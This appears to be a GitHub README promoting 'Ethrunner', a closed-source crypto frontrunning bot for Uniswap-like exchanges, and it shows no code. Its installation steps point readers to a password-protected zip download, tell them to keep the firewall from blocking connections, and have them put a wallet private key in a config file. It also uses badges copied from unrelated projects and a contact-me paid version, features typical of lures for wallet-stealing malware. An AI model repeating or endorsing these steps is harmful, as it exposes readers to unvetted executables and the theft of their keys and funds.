### Ethrunner

<p align="center">
  <a href="https://www.npmjs.com/package/hashlips_art_engine">
    <img alt="downloads" src="https://img.shields.io/npm/dm/hashlips_art_engine.svg?color=blue" target="_blank" />
  </a>
  <a href="https://github.com/kefranabg/readme-md-generator/blob/master/LICENSE">
    <img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-yellow.svg" target="_blank" />
  </a>
  <a href="https://codecov.io/gh/kefranabg/readme-md-generator">
    <img src="https://codecov.io/gh/kefranabg/readme-md-generator/branch/master/graph/badge.svg" />
  </a>
  <a href="https://github.com/frinyvonnick/gitmoji-changelog">
    <img src="https://img.shields.io/badge/changelog-gitmoji-brightgreen.svg" alt="gitmoji-changelog">
  </a>
  <a href="https://twitter.com/ethrunner">
    <img alt="Twitter: hashlipsnft" src="https://img.shields.io/twitter/follow/ethrunner.svg?style=social" target="_blank" />
  </a>
</p>

<p align="center">
  <img src="https://github.com/timo991/ethrunner/blob/main/ethrunner.png?raw=true"/>
</p>

### What is frontrunning bot?
  A frontrunning bot specialized in automated market making (AMM) takes advantage of price fluctuations observed in decentralized exchanges (DEXs) that utilize the AMM model, such as Uniswap or PancakeSwap. By leveraging advanced algorithms, this bot actively monitors the network for impending trades and assesses the potential market impact of these trades. 
  
  It strategically positions itself to capitalize on the price changes resulting from the original trades by executing its own trades before the initial orders are processed. The bot achieves this by analyzing the mempool, which comprises unconfirmed transactions awaiting inclusion in the blockchain. Through careful examination of the mempool and price movements, the bot predicts the price shifts that will occur upon trade execution, enabling it to execute profitable trades. AMM frontrunning bots prove particularly effective in DEXs with limited liquidity, as substantial trades can significantly impact the market, leading to exploitable price changes.

### Features
- **Multiple networks**: The bot can iteract with Uniswap-like AMMs on chains ETHEREUM, POLYGON, ARBITRUM, AVALANCHE, BINANCE and PULSECHAIN networks (Uniswap-v3, Pancacke, Pulsex-v2)
- **Mempool Monitoring**: The bot continuously monitors the mempool of the network, providing up-to-date information on pending transactions.
- **Transaction Analysis**: The bot analyzes pending transactions in the mempool, providing insights into transaction fees, gas prices, and other relevant metrics.
- **Profit transaction**: The bot performs transactions for most relevant pairs with low liquidity.

### Requirements
- Windows 7 or older
- .NET framework 4.7.2 runtime
- RPCs for each network (ex. Infura)

### Public version
- Supported networks: BSC ARB PULSE
- Active contracts: 5
- Notifications: no

Actual free version in release section.

### Private version
No limits!
No beta versions! 
For more information contact with me.

### Installation (public version)
1. [Install](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net472) .NET framework 4.7.2 runtime if it has not been installed.
2. [Download](https://github.com/timo991/frontrunner-bot/releases/download/Release2/ethrunner-0.4.2.zip) repository release and extract files with password `o9vbwkhO5X`.
3. Make sure that firewall does not blocks any connections.

### Usage
1. Open `config.json`. Edit network PRCs and private key for active account.
2. Launch software. Select AMM you need, set up contracts for monitoring.
3. In transaction section set up gas fees and profit percentage.
4. Start monitoring mempool and wait for profit.

All detailed instructions, support and tips in professional version only :).

### Copyright
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. FRONTRUN BOT, MEMPOOL BOT, FRONTRUNNING BOT*
